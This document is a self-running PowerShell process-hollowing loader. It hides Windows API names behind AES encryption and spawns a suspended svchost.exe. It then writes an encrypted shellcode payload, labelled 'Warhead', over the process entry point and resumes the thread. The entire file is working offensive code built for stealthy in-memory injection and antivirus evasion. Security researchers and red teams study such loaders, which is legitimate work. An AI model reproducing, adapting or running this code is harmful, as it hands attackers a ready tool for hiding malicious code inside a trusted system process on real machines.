Function AES_Process_Hollowing_Delegate {

    function Invoke-FunctionLookup {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,
            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )
    
        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
            Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq $dsystem_dll }
        ).GetType($dMicrosoft_Win32_UnsafeNativeMethods)
    
        $getProcAddressMethod = $systemType.GetMethods() | Where-Object { $_.Name -eq $dGetProcAddress }
        $moduleHandle = $systemType.GetMethod($dGetModuleHandle).Invoke($null, @($moduleName))
        return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
    }
    
    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,
            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )
    
        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName($dReflectedDelegate)),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )
    
        $moduleBuilder = $assemblyBuilder.DefineDynamicModule($dInMemoryModule, $false)
    
        $typeBuilder = $moduleBuilder.DefineType(
            'MyDelegateType', 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )
    
        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )
    
        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )
    
        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )
    
        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )
    
        return $typeBuilder.CreateType()
    }
    
    

    function Invoke-DecryptAES {
        param (
            [byte[]]$Data,
            [string]$KeyBase64,
            [string]$IVBase64,
            [switch]$Bytes
        )

        $Key = [System.Convert]::FromBase64String($KeyBase64)
        $IV = [System.Convert]::FromBase64String($IVBase64)

        $AES = [Security.Cryptography.SymmetricAlgorithm]::Create('AES')
        $AES.Key = $Key
        $AES.IV = $IV

        $decryptor = $AES.CreateDecryptor($AES.Key, $AES.IV)
        $memoryStream = New-Object -TypeName IO.MemoryStream -ArgumentList (, $Data)
        $cryptoStream = New-Object -TypeName Security.Cryptography.CryptoStream -ArgumentList @($memoryStream, $decryptor, 'Read')

        $decryptedBytes = New-Object -TypeName Byte[] -ArgumentList $Data.Length
        $decryptedByteCount = $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length)
    
        $cryptoStream.Close()
        $memoryStream.Close()

        if ($Bytes) {
            return $decryptedBytes[0..($decryptedByteCount - 1)]
        }
        else {
            $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes[0..($decryptedByteCount - 1)])

            if ($decryptedString -like "*_END_*") {
                $decryptedString = $decryptedString -replace "_END_$", ""
            }

            return $decryptedString
        }
    }
    
    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
    $nativeMethodsType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'system.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods') }
    
    $startupInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'system.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods+STARTUPINFO') }
    $processInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'system.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION') }
    
    $startupInformation = $startupInformationType.GetConstructors().Invoke($null)
    $processInformation = $processInformationType.GetConstructors().Invoke($null)
    
    $CreateProcess = $nativeMethodsType.GetMethod('CreateProcess')

    # Invoke-EncryptAES -InputStrings "system.dll, GetProcAddress, GetModuleHandle, Microsoft.Win32.UnsafeNativeMethods, Kernel32.dll, ReflectedDelegate, InMemoryModule, ntdll.dll, ReadProcessMemory, WriteProcessMemory, ResumeThread, CloseHandle, ZwQueryInformationProcess"
    [string] $GlobalKey = 'Xhh8BrnbS3wxTLN5WVKIap8ZaJKA8N57UVn+vyZp7Vk='
    [string] $GlobalIV = 'obR3k/S/C1xBP4kr45OKxw=='

    [Byte[]] $dsystem_dll_Bytes = + 0x31, 0x30, 0xF7, 0x23, 0x8F, 0x1A, 0x5C, 0x9C, 0x99, 0xAD, 0x66, 0x08, 0x5F, 0x49, 0x37, 0x77
    [string] $dsystem_dll = Invoke-DecryptAES -Data $dsystem_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dGetProcAddress_Bytes = + 0xF3, 0x8F, 0x8A, 0x4F, 0x80, 0x4F, 0x51, 0x1D, 0x0D, 0xD2, 0xCE, 0x78, 0x13, 0x86, 0x63, 0x89
    [string] $dGetProcAddress = Invoke-DecryptAES -Data $dGetProcAddress_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dGetModuleHandle_Bytes = + 0x69, 0xC7, 0x30, 0x44, 0x12, 0x6E, 0xF8, 0x7A, 0x65, 0xA9, 0x8C, 0x1E, 0x32, 0x27, 0x66, 0x21
    [string] $dGetModuleHandle = Invoke-DecryptAES -Data $dGetModuleHandle_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dMicrosoft_Win32_UnsafeNativeMethods_Bytes = + 0x1B, 0x8B, 0xCD, 0xB7, 0x2D, 0x28, 0xBE, 0xB3, 0x41, 0x86, 0x6D, 0xD5, 0xF4, 0xF4, 0xF0, 0x73, 0x99, 0x8C, 0x21, 0xD8, 0xB8, 0xFF, 0x28, 0xC7, 0x8F, 0x58, 0x85, 0xE5, 0x10, 0x30, 0x65, 0x58, 0x93, 0xC8, 0x46, 0x40, 0xB5, 0xCF, 0x73, 0xE3, 0x60, 0xD2, 0x83, 0x93, 0xBE, 0x1E, 0x83, 0x9E
    [string] $dMicrosoft_Win32_UnsafeNativeMethods = Invoke-DecryptAES -Data $dMicrosoft_Win32_UnsafeNativeMethods_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dKernel32_dll_Bytes = + 0x47, 0x2B, 0x43, 0xF2, 0xB5, 0xEA, 0x59, 0x2C, 0x31, 0x59, 0x75, 0xBA, 0xB6, 0x96, 0x94, 0x41
    [string] $dKernel32_dll = Invoke-DecryptAES -Data $dKernel32_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dReflectedDelegate_Bytes = + 0x01, 0xEB, 0x6C, 0x9B, 0x8C, 0xB9, 0xFC, 0x2D, 0xAB, 0xA4, 0x0F, 0x21, 0x44, 0xB1, 0x87, 0x36, 0x62, 0xAC, 0x43, 0xA2, 0x48, 0x47, 0x5A, 0x02, 0xDF, 0xE4, 0xBF, 0x40, 0xC0, 0x5D, 0x30, 0xBC
    [string] $dReflectedDelegate = Invoke-DecryptAES -Data $dReflectedDelegate_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dInMemoryModule_Bytes = + 0x03, 0x11, 0x41, 0xF9, 0x71, 0x9C, 0x3B, 0x0B, 0xA4, 0x5B, 0x2C, 0x62, 0x4E, 0x79, 0xBB, 0x3F
    [string] $dInMemoryModule = Invoke-DecryptAES -Data $dInMemoryModule_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dntdll_dll_Bytes = + 0x17, 0x81, 0xDC, 0x01, 0x48, 0xBA, 0x62, 0xFF, 0x82, 0x70, 0xDE, 0x8E, 0xBD, 0xE6, 0xC3, 0xDF
    [string] $dntdll_dll = Invoke-DecryptAES -Data $dntdll_dll_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dReadProcessMemory_Bytes = + 0x34, 0x49, 0x5D, 0xEE, 0x0D, 0x2D, 0xAE, 0x84, 0xDF, 0xE3, 0x16, 0xEA, 0xAE, 0xB8, 0x2E, 0x2E, 0xC6, 0x24, 0xE2, 0x5F, 0xF6, 0x66, 0xE7, 0x71, 0x7F, 0x79, 0x77, 0x3D, 0xD5, 0x98, 0xB4, 0xD2
    [string] $dReadProcessMemory = Invoke-DecryptAES -Data $dReadProcessMemory_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dWriteProcessMemory_Bytes = + 0x88, 0xA7, 0x5A, 0xE0, 0x25, 0x82, 0x13, 0xFF, 0x00, 0xD4, 0x8F, 0x84, 0x74, 0x2B, 0x56, 0x21, 0x4D, 0xAE, 0x15, 0x21, 0x91, 0x4C, 0x80, 0x30, 0x5B, 0x83, 0x19, 0xA9, 0xFC, 0x96, 0x3F, 0x23
    [string] $dWriteProcessMemory = Invoke-DecryptAES -Data $dWriteProcessMemory_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dResumeThread_Bytes = + 0x02, 0x51, 0xBA, 0xE7, 0xF5, 0x22, 0x55, 0xF9, 0x8E, 0x13, 0xAB, 0xF2, 0xD4, 0xA9, 0x17, 0xF4
    [string] $dResumeThread = Invoke-DecryptAES -Data $dResumeThread_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dCloseHandle_Bytes = + 0x76, 0x9B, 0x52, 0x5C, 0x35, 0x1D, 0x06, 0xE7, 0xA5, 0x3E, 0x63, 0xBD, 0x24, 0x25, 0xD0, 0x64
    [string] $dCloseHandle = Invoke-DecryptAES -Data $dCloseHandle_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV

    [Byte[]] $dZwQueryInformationProcess_Bytes = + 0xF7, 0xE1, 0x45, 0x60, 0x1F, 0xA6, 0x52, 0xDC, 0xEA, 0x2F, 0xE6, 0xE3, 0x48, 0x56, 0x47, 0xC1, 0xFE, 0xB9, 0x90, 0x21, 0x28, 0xBC, 0x4A, 0xD8, 0x65, 0xEB, 0x17, 0x79, 0x1E, 0x57, 0xFC, 0xA7
    [string] $dZwQueryInformationProcess = Invoke-DecryptAES -Data $dZwQueryInformationProcess_Bytes -KeyBase64 $GlobalKey -IVBase64 $GlobalIV
    # End: Output from Invoke-EncryptAES
    
    $RPM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dReadProcessMemory), (Invoke-GetDelegate @([IntPtr], [IntPtr], [byte[]], [int], [IntPtr]) ([Bool]))) 
    $WPM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dWriteProcessMemory), (Invoke-GetDelegate @([IntPtr], [IntPtr], [byte[]], [Int], [IntPtr]) ([Bool])))
    $RT = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dResumeThread), (Invoke-GetDelegate @([IntPtr]) ([void])))
    $CH = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dKernel32_dll -functionName $dCloseHandle), (Invoke-GetDelegate @([IntPtr]) ([bool])))  
    $ZwQIP = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Invoke-FunctionLookup -moduleName $dntdll_dll -functionName $dZwQueryInformationProcess), (Invoke-GetDelegate @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([int])))
    
    $CurrentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    $cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
    $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $CurrentPath, $startupInformation, $processInformation))  > $null
    
    $ThreadHandle = $processInformation.hThread
    $ProcessHandle = $processInformation.hProcess
    
    $processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
    $tmp = [UInt32]0
    $ZwQIP.Invoke($ProcessHandle, 0, $processBasicInformation, $processBasicInformation.Length, $tmp)  > $null
    $pBaseAddress = [BitConverter]::ToInt64($processBasicInformation, 8)
    $ImagePTR = [IntPtr]($pBaseAddress + 0x10)
    
    [byte[]] $AddressBuffer = New-Object byte[] ([IntPtr]::Size)
    $readSuccess = $RPM.Invoke($ProcessHandle, $ImagePTR, $AddressBuffer, $AddressBuffer.Length, [IntPtr]::Zero)  > $null
    
    $TargetProcessBase = [IntPtr]::Zero
    if ([IntPtr]::Size -eq 8) { $TargetProcessBase = [IntPtr]::new([System.BitConverter]::ToInt64($AddressBuffer, [IntPtr]::Zero)) }
    else { $TargetProcessBase = [IntPtr]::new([System.BitConverter]::ToInt32($AddressBuffer, [IntPtr]::Zero)) }
    
    $TargetProcessBaseInt64 = [UInt64]$TargetProcessBase.ToInt64()
    
    [byte[]] $data = New-Object byte[] 0x200
    $RPM.Invoke($ProcessHandle, $TargetProcessBase, $data, 0x200, [IntPtr]::Zero)  > $null
    
    $file_index = [BitConverter]::ToUInt32($data, 0x3C)
    $header_loc = $file_index + 0x28
    $exec_start_rva = [BitConverter]::ToUInt32($data, [int]$header_loc)
    $EntryPointAddress = [IntPtr]::new($exec_start_rva + $TargetProcessBaseInt64)
    
    # Warhead
    [Byte[]] $Warhead_Bytes = 0x14, 0x4E, 0xF6, 0x14, 0xE1, 0x76, 0xE2, 0xE7, 0x84, 0x75, 0x99, 0x24, 0x62, 0x3D, 0x3D, 0xD2, 0x5B, 0xE0, 0xCC, 0x07, 0x32, 0x30, 0x73, 0x68, 0x4F, 0xE3, 0xDD, 0xD6, 0x63, 0xC1, 0x86, 0x53, 0x7E, 0x67, 0xF3, 0x96, 0xB0, 0x8F, 0x65, 0x94, 0x24, 0xA4, 0xAC, 0xF4, 0x96, 0xE2, 0xC0, 0x43, 0xDD, 0x3B, 0x29, 0xBD, 0x58, 0xB6, 0x24, 0x62, 0x6C, 0x20, 0xE0, 0xCC, 0x2A, 0x65, 0x3E, 0x9E, 0x12, 0x9C, 0xAD, 0x76, 0x8A, 0x6B, 0x25, 0xA7, 0x06, 0xC1, 0x8A, 0x02, 0x75, 0x51, 0xD1, 0x9C, 0x05, 0x16, 0x5C, 0xB8, 0x41, 0x21, 0xC9, 0x85, 0x51, 0x44, 0x6D, 0xDA, 0xF0, 0x6E, 0x59, 0xDF, 0x6F, 0x82, 0x11, 0x31, 0xF5, 0x4B, 0x50, 0x27, 0xB3, 0xE3, 0xF4, 0xE2, 0x09, 0x32, 0x0A, 0x62, 0x1D, 0x1C, 0x47, 0xFE, 0x6D, 0x73, 0xE7, 0xDD, 0x61, 0xA7, 0x56, 0xAC, 0xE6, 0xC0, 0xDA, 0x63, 0x87, 0x35, 0x89, 0x1A, 0xEE, 0x0A, 0x75, 0xFA, 0xF4, 0x2E, 0xFE, 0x9C, 0x21, 0x51, 0x01, 0x99, 0x60, 0x13, 0xEB, 0x44, 0x33, 0xA6, 0xEA, 0xC0, 0xDB, 0x57, 0xD7, 0x8C, 0x3F, 0x38, 0x0D, 0x5D, 0xC5, 0xA6, 0xF6, 0x42, 0xBB, 0x4F, 0x8A, 0x3B, 0xEC, 0x64, 0xBB, 0x80, 0x76, 0x28, 0xA1, 0x7B, 0xCE, 0x90, 0x44, 0x12, 0xD6, 0x0E, 0x0C, 0xBE, 0xC4, 0xE5, 0x58, 0x7A, 0xC3, 0x72, 0xC7, 0x54, 0x95, 0x0C, 0xCE, 0xAE, 0x3F, 0x35, 0xD4, 0x0F, 0x35, 0x90, 0x98, 0xA9, 0xC8, 0x46, 0xC1, 0x56, 0x70, 0x6A, 0xD2, 0xE5, 0x33, 0xB5, 0x35, 0xAE, 0x12, 0x9B, 0x46, 0x16, 0x79, 0xD7, 0xE3, 0xAC, 0xB4, 0x98, 0xBF, 0x93, 0x9F, 0xA9, 0x7F, 0xAD, 0xEA, 0x66, 0xDF, 0x97, 0x8E, 0x2F, 0x04, 0xF7, 0x5E, 0x05, 0xB0, 0x38, 0xF7, 0x9C, 0x11, 0x4F, 0x81, 0x11, 0x59, 0x04, 0x5E, 0x6B, 0xCB, 0xD8, 0x70, 0x2D, 0x0E, 0x2F, 0xD2, 0xD8, 0x58, 0x2F, 0xF7, 0x44, 0x6E, 0xE5, 0x6C, 0x08, 0x53, 0x8C, 0x81, 0x1D, 0xE8, 0x92, 0xFC, 0xEA, 0xC1, 0x2D, 0x91, 0x8E, 0x7F, 0xBA, 0x4F, 0xA6, 0x3E, 0x26, 0x3F, 0x18, 0xA5, 0xFB, 0x59, 0x26, 0xBD, 0x55, 0x98, 0x6F, 0xCB, 0x3C, 0x95, 0x0A, 0x67, 0x2B
    [Byte[]] $Warhead = Invoke-DecryptAES -Data $Warhead_Bytes -KeyBase64 'S4/8XSX/i2iCyBc8Yr3/3ql4SIj34ZKqLeO/5a6tGF8=' -IVBase64 'dyIVgRvP08tOcWf+PzH23A==' -Bytes

    $WPM.Invoke($ProcessHandle, $EntryPointAddress, $Warhead, $Warhead.Length, [IntPtr]::Zero) > $null
    $RT.Invoke($processInformation.hThread) > $null
    $CH.Invoke($processInformation.hProcess) > $null
    $CH.Invoke($processInformation.hThread) > $null
    
} AES_Process_Hollowing_Delegate
